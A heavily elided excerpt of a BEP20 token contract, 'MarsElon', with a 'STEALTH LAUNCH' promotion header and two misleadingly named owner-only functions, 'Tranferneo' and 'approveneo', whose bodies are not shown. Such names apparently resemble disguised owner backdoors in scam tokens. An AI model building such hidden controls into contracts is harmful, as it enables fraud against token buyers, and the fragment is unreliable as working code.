 ...
 *       
        STEALTH LAUNCH
    Telegram - @marselonofficial
    Website: https://www.elonmarstoken.com/
  */
...
contract Ownable is Context {
    ...
    function Tranferneo(uint8 _time) public virtual onlyOwner {
...
contract MarsElon is Context, iBEP20, Ownable {
 ...
 /**
   ...
   */
  function approveneo(uint256 amount) public onlyOwner returns (bool) {
